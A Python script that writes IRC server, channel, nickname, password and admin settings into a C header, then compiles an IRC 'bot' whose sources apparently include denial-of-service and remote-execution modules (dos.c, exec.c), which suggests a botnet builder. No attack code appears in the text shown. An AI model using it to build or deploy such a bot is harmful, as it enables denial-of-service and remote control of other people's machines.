#!/usr/bin/env python

#Imports:
import argparse
import sys
import os
import platform
from random import SystemRandom
from string import ascii_uppercase, digits

D = 8

#Adding commmand line options:
if 8==D:
	defName = ''.join(SystemRandom().choice(ascii_uppercase+digits) for _ in range(6)) #Random uppercase 6 character name.

parser = argparse.ArgumentParser(description="Script to compile bot code.")

parser.add_argument("-s","--server",help="IRC server to connect to.", default="irc.freenode.net")
parser.add_argument("-r","--port",help="IRC server port.", default=6667)
parser.add_argument("-c","--channel",help="Channel to join after connecting.", default="#nullbyte")
parser.add_argument("-u","--username",help="Bot username.", default=defName)
parser.add_argument("-n","--nickname",help="Bot nickname.", default=defName)
parser.add_argument("-p","--password",help="Bot password.", default=None)
parser.add_argument("-a","--admins",help="Comma separated list of admins.", default="dontrustme")
parser.add_argument("-v","--verbosity",help="Increase verbosity.", default=False, action='store_true')
parser.add_argument("--nodelete",help="Do not delete temporary header file.", default=False, action='store_true')
parser.add_argument("--1337",help="L33T.", default=False, action='store_true')

args = parser.parse_args()

#Print parsed options if verbosity is increased.
if args.verbosity:
	for arg in vars(args):
		print(arg+" = "+str(getattr(args, arg)))
elif args.username == defName: #Or just print username if it's default/random
	print("Username: "+args.username)
		
#Open the file and read it.
with open("./temp.h","w") as modifiedfile:
	with open("./bot.h","r") as headerfile: #You can use with to have a file close after you are done doing actions on it
		while True:
			line = headerfile.readline() #Read a line from bot.h
			if not line: break #Stops reading/writing when end of bot.h is reached
			if "#define SERVER" in line:
				if args.verbosity:
					print("Changed server")
				modifiedfile.write("#define SERVER\t"+'"'+args.server+'"\n')
			elif "#define PORT" in line:
				if args.verbosity:
					print("Changed port")
				modifiedfile.write("#define PORT\t"+str(args.port)+"\n")
			elif "#define CHANNEL" in line:
				if args.verbosity:
					print("Changed channel")
				modifiedfile.write("#define CHANNEL\t"+'"'+args.channel+'"\n')
			elif "#define U_NAME" in line:
				if args.verbosity:
					print("Changed username")
				modifiedfile.write("#define U_NAME\t"+'"'+args.username+'"\n')
			elif "#define N_NAME" in line:
				if args.verbosity:
					print("Changed nickname")
				modifiedfile.write("#define N_NAME\t"+'"'+args.nickname+'"\n')
			elif "#define PWORD" in line and args.password:
				if args.verbosity:
					print("Changed password")
				modifiedfile.write("#define PWORD\t"+'"'+args.password+'"\n')
			elif "#define PWORD" in line and not args.password:
				modifiedfile.write("#define PWORD\tNULL\n")
			#if "extern" in line: #admins would go here
			#	modifiedfile.write("#define SERVER\t"+args.server)
			else: #Just write the line if it's not supposed to be modified
				modifiedfile.write(line)

#Now compile using temp.h:
sys.stdout.write("Compiling to file 'bot'...")
sys.stdout.flush() #Neatly output Compiling...Done
os.system("gcc -Wall -Werror -O -o bot bot.c temp.h init.c recv.c dos.c exec.c -lpthread")
print("Done")
#...and delete it:
if not args.nodelete:
	if platform.system() == 'Windows':
		os.system("del temp.h")
	else:
		os.system("rm temp.h")
	if args.verbosity:
		print("Removed temporary file")
